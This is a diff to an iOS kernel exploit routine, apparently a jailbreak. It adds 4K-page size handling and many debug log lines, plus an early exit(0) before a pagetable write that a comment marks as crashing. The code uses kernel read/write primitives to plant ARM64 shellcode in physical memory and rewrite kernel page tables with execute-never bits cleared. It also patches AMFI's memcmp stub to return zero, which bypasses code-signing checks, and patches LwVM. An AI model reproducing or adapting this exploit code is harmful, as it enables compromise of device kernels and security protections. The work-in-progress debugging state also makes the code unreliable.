@@ -149,9 +149,9 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
     checkvad();
 
     vm_address_t vmd = 0;
-    _kernelrpc_mach_vm_allocate_trap(mach_task_self(), &vmd, 0x4000, VM_FLAGS_ANYWHERE);
+    _kernelrpc_mach_vm_allocate_trap(mach_task_self(), &vmd, isvad == 0 ? 0x4000 : 0x1000, VM_FLAGS_ANYWHERE);
     
-    copyin((void*)vmd, kernbase, 0x4000);
+    copyin((void*)vmd, kernbase, isvad == 0 ? 0x4000 : 0x1000);
     
     struct mach_header_64* vmk = vmd;
     uint64_t max = 0;
@@ -178,8 +178,10 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
     
     char* kdump = malloc(max-min);
 
-    for (int k=0; k < (max-min)/0x4000; k++) {
-        copyin(kdump+k*0x4000, min+k*0x4000, 0x4000);
+    int vadOffset = isvad == 0 ? 0x4000 : 0x1000;
+    
+    for (int k=0; k < (max-min)/vadOffset; k++) {
+        copyin(kdump+k*vadOffset, min+k*vadOffset, vadOffset);
     }
     
     NSLog(@"%llx", kdump);
@@ -262,8 +264,9 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
     uint64_t pmap_store = find_kernel_pmap();
     NSLog(@"pmap: %llx", pmap_store);
     level1_table = ReadAnywhere64(ReadAnywhere64(find_kernel_pmap()));
-
-    uint64_t shellcode = physalloc(0x4000);
+    NSLog(@"debug: test point 1");
+    uint64_t shellcode = physalloc(isvad == 0 ? 0x4000 : 0x1000);
+    NSLog(@"debug: test point 2");
     
     /*
      ldr x30, a
@@ -276,18 +279,20 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
      .quad 0
      none of that squad shit tho, straight gang shit. free rondonumbanine
      */
-    
+    NSLog(@"debug: test point 3");
     WriteAnywhere32(shellcode + 0x100, 0x5800009e); /* trampoline for idlesleep */
     WriteAnywhere32(shellcode + 0x100 + 4, 0x580000a0);
     WriteAnywhere32(shellcode + 0x100 + 8, 0xd61f0000);
-
+    NSLog(@"debug: test point 4");
     WriteAnywhere32(shellcode + 0x200, 0x5800009e); /* trampoline for deepsleep */
     WriteAnywhere32(shellcode + 0x200 + 4, 0x580000a0);
     WriteAnywhere32(shellcode + 0x200 + 8, 0xd61f0000);
-
+    NSLog(@"debug: test point 5");
     char buf[0x100];
     copyin(buf, optr, 0x100);
+    NSLog(@"debug: test point 6");
     copyout(shellcode+0x300, buf, 0x100);
+    NSLog(@"debug: test point 7");
     
     uint64_t physcode = findphys_real(shellcode);
     
@@ -346,7 +351,7 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
     }
     
     
-    uint64_t shc = physalloc(0x4000);
+    uint64_t shc = physalloc(isvad == 0 ? 0x4000 : 0x1000);
     
     uint64_t regi = find_register_value((uint32_t*)get_data_for_mode(0, SearchTextExec), idlesleep_handler+12-gadget_base, text_exec_base, 30);
     uint64_t regd = find_register_value((uint32_t*)get_data_for_mode(0, SearchTextExec), idlesleep_handler+24-gadget_base, text_exec_base, 30);
@@ -368,11 +373,15 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
     
     NSLog(@"ttbr0: %llx %llx",ReadAnywhere64(ttbr0_real), ttbr0_real);
     
-    char* bbuf = malloc(0x4000);
+    char* bbuf = malloc(isvad == 0 ? 0x4000 : 0x1000);
+    NSLog(@"debug: test point 8");
     copyin(bbuf, ReadAnywhere64(ttbr0_real) - gPhysBase + gVirtBase, isvad == 0 ? 0x4000 : 0x1000);
+    NSLog(@"debug: test point 9");
     copyout(level0_pte, bbuf, isvad == 0 ? 0x4000 : 0x1000);
+    NSLog(@"debug: test point 10");
     
     uint64_t physp = findphys_real(level0_pte);
+    NSLog(@"debug: test point 11");
     
     WriteAnywhere32(shc,    0x5800019e); // ldr x30, #40
     WriteAnywhere32(shc+4,  0xd518203e); // msr ttbr1_el1, x30
@@ -385,6 +394,7 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
     WriteAnywhere32(shc+32, 0xd65f03c0); // ret
     WriteAnywhere64(shc+40, regi);
     WriteAnywhere64(shc+48, /* new ttbr1 */ physp);
+    NSLog(@"debug: test point 12");
     
     shc+=0x100;
     WriteAnywhere32(shc,    0x5800019e); // ldr x30, #40
@@ -414,17 +424,21 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
         WriteAnywhere32(shc+0x200+n, 0x0e00400f); n+=4; // tbl.8b v15, { v0, v1, v2 }, v0
         
     }
-
-    mach_vm_protect(tfp0, shc, 0x4000, 0, VM_PROT_READ|VM_PROT_EXECUTE);
-
-    uint64_t fake1 = physalloc(0x4000);
-    copyin(bbuf, level0_pte, 0x4000);
-    copyout(fake1, bbuf, 0x4000);
+    NSLog(@"debug: test point 13");
+    mach_vm_protect(tfp0, shc, isvad == 0 ? 0x4000 : 0x1000, 0, VM_PROT_READ|VM_PROT_EXECUTE);
+    NSLog(@"debug: test point 14");
+    uint64_t fake1 = physalloc(isvad == 0 ? 0x4000 : 0x1000);
+    NSLog(@"debug: test point 15");
+    copyin(bbuf, level0_pte, isvad == 0 ? 0x4000 : 0x1000);
+    NSLog(@"debug: test point 16");
+    copyout(fake1, bbuf, isvad == 0 ? 0x4000 : 0x1000);
+    NSLog(@"debug: test point 17");
     uint64_t fake1_p = findphys_real(fake1);
+    NSLog(@"debug: test point 18");
     
     
     vm_address_t kppsh = 0;
-    mach_vm_allocate(tfp0, &kppsh, 0x4000, VM_FLAGS_ANYWHERE);
+    mach_vm_allocate(tfp0, &kppsh, isvad == 0 ? 0x4000 : 0x1000, VM_FLAGS_ANYWHERE);
 
     {
         int n = 0;
@@ -445,14 +459,13 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
         WriteAnywhere64(kppsh+n, physp); n+=8;
     }
     
-    mach_vm_protect(tfp0, kppsh, 0x4000, 0, VM_PROT_READ|VM_PROT_EXECUTE);
+    mach_vm_protect(tfp0, kppsh, isvad == 0 ? 0x4000 : 0x1000, 0, VM_PROT_READ|VM_PROT_EXECUTE);
 
     WriteAnywhere64(shellcode + 0x100 + 0x10, shc - gVirtBase + gPhysBase); // idle
     WriteAnywhere64(shellcode + 0x200 + 0x10, shc + 0x100 - gVirtBase + gPhysBase); // idle
     
     WriteAnywhere64(shellcode + 0x100 + 0x18, idlesleep_handler - gVirtBase + gPhysBase + 8); // idlehandler
     WriteAnywhere64(shellcode + 0x200 + 0x18, idlesleep_handler - gVirtBase + gPhysBase + 8); // deephandler
-
     /*
     
      pagetables are now not real anymore, they're real af
@@ -464,18 +477,22 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
     
     while (1) {
         if (opps[cpacr_idx] == 0xd5181040) {
-            NSLog(@"got a cpacr");
+            NSLog(@"got a cpacr at %d", cpacr_idx);
             break;
         }
         cpacr_idx++;
     }
+    NSLog(@"debug ---");
 #define PSZ (isvad ? 0x1000 : 0x4000)
 #define PMK (PSZ-1)
     
     
 #define RemapPage(address) \
+    NSLog(@"debug 18*");\
     pagestuff_64((address) & (~PMK), ^(vm_address_t tte_addr, int addr) {\
+        NSLog(@"debug 18a");\
         uint64_t tte = ReadAnywhere64(tte_addr);\
+        NSLog(@"debug 18a1");\
         if (!(TTE_GET(tte, TTE_IS_TABLE_MASK))) {\
             NSLog(@"breakup!");\
             uint64_t fakep = physalloc(PSZ);\
@@ -488,50 +505,78 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
             TTE_SET(tte, TTE_PHYS_VALUE_MASK, findphys_real(fakep));\
             WriteAnywhere64(tte_addr, tte);\
         }\
+        NSLog(@"debug 18b");\
         uint64_t newt = physalloc(PSZ);\
+        NSLog(@"debug 18c");\
         copyin(bbuf, TTE_GET(tte, TTE_PHYS_VALUE_MASK) - gPhysBase + gVirtBase, PSZ);\
+        NSLog(@"debug 18d");\
         copyout(newt, bbuf, PSZ);\
+        NSLog(@"debug 18e");\
         TTE_SET(tte, TTE_PHYS_VALUE_MASK, findphys_real(newt));\
+        NSLog(@"debug 18f");\
         TTE_SET(tte, TTE_BLOCK_ATTR_UXN_MASK, 0);\
+        NSLog(@"debug 18g");\
         TTE_SET(tte, TTE_BLOCK_ATTR_PXN_MASK, 0);\
+        NSLog(@"debug 18h");\
         WriteAnywhere64(tte_addr, tte);\
         NSLog(@"level %llx - %llx", tte_addr,              TTE_GET(tte, TTE_PHYS_VALUE_MASK));\
     }, level1_table, 2);
 
+    NSLog(@"debug: test point 18z1");
     level1_table = physp - gPhysBase + gVirtBase;
-    WriteAnywhere64(ReadAnywhere64(find_kernel_pmap()), level1_table);
+    NSLog(@"debug: test point 18z2");
+    ReadAnywhere64(find_kernel_pmap());
+    NSLog(@"%llu, %d", ReadAnywhere64(find_kernel_pmap()), level1_table); // 0xfffffff022b9a868, 0x20a00000
+    exit(0);
+    WriteAnywhere64(ReadAnywhere64(find_kernel_pmap()), level1_table); // crashes
     
 #define NewPointer(origptr) (((origptr) & PMK) | findphys_real(origptr) - gPhysBase + gVirtBase)
     
+    NSLog(@"debug: test point 19");
+    
     uint64_t shtramp = kernbase + mh_kern->sizeofcmds + sizeof(struct mach_header_64);
-    RemapPage(gadget_base + cpacr_idx*4);
+    NSLog(@"debug: test point 19a");
+    RemapPage(gadget_base + cpacr_idx * 4);
+    NSLog(@"debug: test point 19b");
     WriteAnywhere32(NewPointer(gadget_base + cpacr_idx*4), 0x94000000 | (((shtramp - (gadget_base+cpacr_idx*4))/4) & 0x3FFFFFF));
+    
+    NSLog(@"debug: test point 20");
     
     RemapPage(shtramp);
     WriteAnywhere32(NewPointer(shtramp), 0x58000041);
     WriteAnywhere32(NewPointer(shtramp)+4, 0xd61f0020);
     WriteAnywhere64(NewPointer(shtramp)+8, kppsh);
     
+    NSLog(@"debug: test point 21");
     
     uint64_t lwvm_write = find_lwvm_mapio_patch();
     uint64_t lwvm_value = find_lwvm_mapio_newj();
     RemapPage(lwvm_write);
     WriteAnywhere64(NewPointer(lwvm_write), lwvm_value);
     
+    NSLog(@"debug: test point 22");
     
     uint64_t kernvers = (uint8_t*)memmem(whole_dump, (size_t)whole_size, "Darwin Kernel Version", strlen("Darwin Kernel Version")) - whole_dump;
     uint64_t release = (uint8_t*)memmem(whole_dump, (size_t)whole_size, "RELEASE_ARM", strlen("RELEASE_ARM")) - whole_dump;
 
+    NSLog(@"debug: test point 23");
+    
     RemapPage(kernvers+whole_base-4);
     WriteAnywhere32(NewPointer(kernvers+whole_base-4), 1);
     copyout(NewPointer(release+whole_base), "MarijuanARM", 11); /* marijuanarm */
 
+    NSLog(@"debug: test point 24");
+    
     uint64_t memcmp_got = find_amfi_memcmpstub();
     uint64_t ret1 = find_ret_0();
+    
+    NSLog(@"debug: test point 25");
     
     RemapPage(memcmp_got);
     WriteAnywhere64(NewPointer(memcmp_got), ret1);
 
+    NSLog(@"debug: test point 26");
+    
     uint64_t fref = find_reference((uint32_t*)get_data_for_mode(0, SearchTextExec), text_exec_size, text_exec_base, idlesleep_handler+0xC) + text_exec_base;
     NSLog(@"fref at %llx", fref);
 
